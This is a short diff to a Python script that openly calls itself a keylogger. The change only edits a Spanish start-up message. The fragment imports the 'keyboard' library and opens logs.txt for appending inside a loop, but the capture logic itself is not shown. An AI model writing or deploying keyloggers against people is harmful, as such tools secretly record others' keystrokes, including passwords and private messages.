@@ -1,6 +1,6 @@
 import keyboard
 
-print("Keylogger iniciado (ESC para salir)")
+print("Keylogger iniciado (Tecla ESC para salir)")
 
 with open("logs.txt", "a") as archivo:
     while True:
